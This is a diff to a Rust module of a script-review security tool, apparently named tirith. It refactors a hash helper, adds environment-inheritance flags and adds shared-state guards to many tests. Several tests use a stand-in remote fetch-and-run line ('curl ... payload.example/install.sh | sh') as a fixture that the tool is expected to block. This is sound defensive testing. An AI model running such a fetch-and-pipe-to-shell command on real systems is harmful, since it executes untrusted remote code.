@@ -4,8 +4,6 @@ use std::fs;
 use std::io::{self, BufRead, Write};
 use std::path::Path;
 
-use sha2::{Digest, Sha256};
-
 use crate::receipt::Receipt;
 use crate::script_analysis;
 use crate::verdict::{Action, Verdict};
@@ -1359,11 +1357,7 @@ fn require_success_status(status: reqwest::StatusCode) -> Result<(), String> {
     }
 }
 
-fn sha256_hex(content: &[u8]) -> String {
-    let mut hasher = Sha256::new();
-    hasher.update(content);
-    format!("{:x}", hasher.finalize())
-}
+use crate::util::sha256_hex;
 
 fn download_bounded_validated(
     request: ValidatedDownloadRequest,
@@ -1581,6 +1575,8 @@ fn review_script_bytes_for_session(
         clipboard_html: None,
         card_ref: None,
         clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
+        python_inspect_inherited: crate::engine::python_inspect_env_active(),
+        cdpath_inherited: crate::engine::cdpath_env_active(),
     };
     let analyzed = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
         crate::engine::analyze_force_full_without_bypass_returning_policy(&ctx)
@@ -3101,6 +3097,7 @@ mod tests {
 
     #[test]
     fn authorized_remote_runner_rejects_an_operation_swap_before_download() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let authorized_binding =
             remote_run_boundary_binding("https://1.1.1.1/a.sh", None, true, None).unwrap();
         let authorized_operation = authorized_binding.operation();
@@ -3131,6 +3128,7 @@ mod tests {
 
     #[test]
     fn invalid_remote_requests_do_not_reach_replay_consumption() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (url, pin, expected_error) in [
             ("not a URL", None, "invalid URL"),
             (
@@ -3173,6 +3171,7 @@ mod tests {
 
     #[test]
     fn remote_authorization_binds_pin_purpose_and_pipe_argv_before_consumption() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let pin_a = "11".repeat(32);
         let pin_b = "22".repeat(32);
         let requested = RequestedPipeInvocation {
@@ -3229,6 +3228,7 @@ mod tests {
 
     #[test]
     fn fetch_save_authorization_binds_destination_and_all_durable_effects() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let root = tempfile::tempdir().unwrap();
         let approved = root.path().join("approved.sh");
         let substituted = root.path().join("substituted.sh");
@@ -3263,6 +3263,7 @@ mod tests {
 
     #[test]
     fn command_card_fetch_authorization_binds_cache_root_before_network() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let root = tempfile::tempdir().unwrap();
         let approved = root.path().join("approved-cards");
         let substituted = root.path().join("substituted-cards");
@@ -3291,6 +3292,7 @@ mod tests {
 
     #[test]
     fn deferred_destinations_bind_fresh_nested_paths_without_creating_them() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let root = tempfile::tempdir().unwrap();
         let destination = root.path().join("fresh/nested/script.sh");
         let binding =
@@ -3321,6 +3323,7 @@ mod tests {
 
     #[test]
     fn expired_deferred_destination_authorization_creates_no_parent() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let root = tempfile::tempdir().unwrap();
         let destination = root.path().join("fresh/nested/card.json");
         let binding = remote_command_card_cache_boundary_binding(
@@ -3367,6 +3370,7 @@ mod tests {
 
     #[test]
     fn remote_launch_authorization_binds_immutable_bytes_and_final_invocation() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let policy = crate::policy::Policy::default();
         let first_bytes = b"#!/bin/sh\nprintf first\n";
         let first_invocation = test_script_invocation("sh");
@@ -3435,6 +3439,7 @@ mod tests {
 
     #[test]
     fn remote_launch_refuses_a_denied_inferred_script_effect() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let mut policy = crate::policy::Policy::default();
         policy.task_gate.mode = crate::web3_policy::TaskGateMode::Enforce;
         policy
@@ -3480,6 +3485,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_handshake_accepts_only_observed_ack_resumed_eof() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::{Read as _, Write as _};
 
         let mut spec = crate::capsule::CapsuleSpec::locked_down();
@@ -3515,6 +3521,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_handshake_rejects_invalid_duplicate_and_out_of_order_status() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::{Read as _, Write as _};
 
         for sequence in [vec![b'X'], vec![TARGET_LAUNCH_RESUMED]] {
@@ -3571,6 +3578,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_handshake_never_acks_after_authorizer_deadline() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::{Read as _, Write as _};
 
         let mut spec = crate::capsule::CapsuleSpec::locked_down();
@@ -3610,6 +3618,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_authorizer_failure_sends_no_ack() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::{Read as _, Write as _};
 
         let mut spec = crate::capsule::CapsuleSpec::locked_down();
@@ -3754,6 +3763,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_handshake_types_post_ack_eof_as_executed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::{Read as _, Write as _};
 
         let mut spec = crate::capsule::CapsuleSpec::locked_down();
@@ -3786,6 +3796,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_handshake_rejects_resume_prequeued_before_ack() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::{Read as _, Write as _};
 
         let mut spec = crate::capsule::CapsuleSpec::locked_down();
@@ -3822,6 +3833,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_closed_ack_reader_returns_error_without_sigpipe() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::Write as _;
 
         let mut spec = crate::capsule::CapsuleSpec::locked_down();
@@ -3849,6 +3861,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_channels_reject_an_insufficient_fd_budget() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let mut spec = crate::capsule::CapsuleSpec::locked_down();
         spec.resources.max_open_files = Some(3);
         let refusal =
@@ -3864,6 +3877,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn target_exec_dense_fd_budget_probe_child() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::io::Write as _;
         use std::os::fd::{AsRawFd as _, FromRawFd as _};
 
@@ -3970,6 +3984,7 @@ mod tests {
 
     #[test]
     fn execution_transport_rejects_http_without_pin() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let err = validate_download_request(
             "http://downloads.example/install.sh",
             None,
@@ -4011,6 +4026,7 @@ mod tests {
 
     #[test]
     fn malformed_pin_wins_before_url_or_network_validation() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let err =
             validate_download_request("not a URL", Some("not-a-sha256"), DownloadPurpose::Execute)
                 .expect_err("malformed digest must be rejected first");
@@ -4019,6 +4035,7 @@ mod tests {
 
     #[test]
     fn blocking_shell_content_produces_a_blocking_review() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let review = review_script_bytes(
             b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
@@ -4200,6 +4217,7 @@ mod tests {
 
     #[test]
     fn invalid_utf8_and_unsupported_interpreters_refuse_only_execution() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let invalid = b"#!/bin/sh\n\xff\n";
         assert!(review_script_bytes(invalid, true, false, Some(dir.path()), None).is_err());
@@ -4220,6 +4238,7 @@ mod tests {
 
     #[test]
     fn forced_shell_review_ignores_remote_python_and_node_shebangs() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         for content in [
             b"#!/usr/bin/env python3\nprint('remote python')\n".as_slice(),
@@ -4255,6 +4274,7 @@ mod tests {
 
     #[test]
     fn legacy_path_executor_shape_is_retained_but_live_execution_fails_before_io() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::sync::atomic::{AtomicBool, Ordering};
         use std::sync::Arc;
 
@@ -4364,6 +4384,7 @@ mod tests {
     #[cfg(target_os = "macos")]
     #[test]
     fn macos_forced_stdin_refuses_before_network_or_executor() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let options = RunOptions {
             url: "not-a-url".to_string(),
             no_exec: false,
@@ -4419,6 +4440,7 @@ mod tests {
 
     #[test]
     fn authorized_bypass_retains_raw_block_findings() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let mut review = review_script_bytes(
             b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
@@ -4458,6 +4480,7 @@ mod tests {
 
     #[test]
     fn bypass_is_not_honored_for_allow_or_analysis_only_verdicts() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let policy = crate::policy::Policy {
             allow_bypass_env: true,
@@ -4509,6 +4532,7 @@ mod tests {
 
     #[test]
     fn forced_stdin_surface_records_but_never_honors_explicit_bypass() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let mut review = review_script_bytes(
             b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
@@ -4824,6 +4848,7 @@ mod tests {
     #[cfg(target_os = "linux")]
     #[test]
     fn post_review_cache_swap_cannot_change_execution_bytes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::os::fd::AsRawFd as _;
         use std::os::unix::process::CommandExt as _;
         use std::sync::{Arc, Barrier};
